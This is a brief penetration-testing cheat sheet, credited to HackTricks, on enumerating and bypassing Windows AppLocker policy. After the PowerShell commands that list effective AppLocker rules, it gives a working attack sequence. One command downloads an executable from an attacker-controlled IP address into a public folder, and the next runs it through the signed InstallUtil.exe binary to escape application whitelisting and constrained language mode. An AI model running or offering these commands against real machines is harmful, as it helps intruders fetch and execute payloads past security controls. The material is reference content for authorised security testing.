# AppLockerPolicy
```
Get-ApplockerPolicy -Effective -xml
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
```
iwr -UseBasicParsing http://192.168.100.199/ConstrainedMode.exe -OutFile "C:\Users\Public\ConstrainedMode.exe"
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U C:\Users\Public\ConstrainedMode.exe
```
Credit @https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters#applockerpolicy
